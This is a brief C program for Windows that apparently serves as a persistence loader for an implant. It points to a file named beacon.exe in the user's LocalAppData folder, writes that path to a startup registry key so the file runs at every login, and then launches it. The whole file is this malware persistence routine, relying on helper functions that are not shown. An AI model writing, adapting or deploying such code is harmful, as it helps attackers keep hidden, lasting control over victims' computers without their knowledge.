#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winbase.h>
#include "helpers.h"


int main() {
    const size_t bufferLen = 500;
    char *localAppdataPath = getenv("LOCALAPPDATA");
    char beacon_path[bufferLen];
    snprintf(beacon_path, bufferLen, "%s\\beacon.exe", localAppdataPath);
    int return_val;

    write_to_startup_regkey("beacon", beacon_path);

    return run_command(beacon_path);
}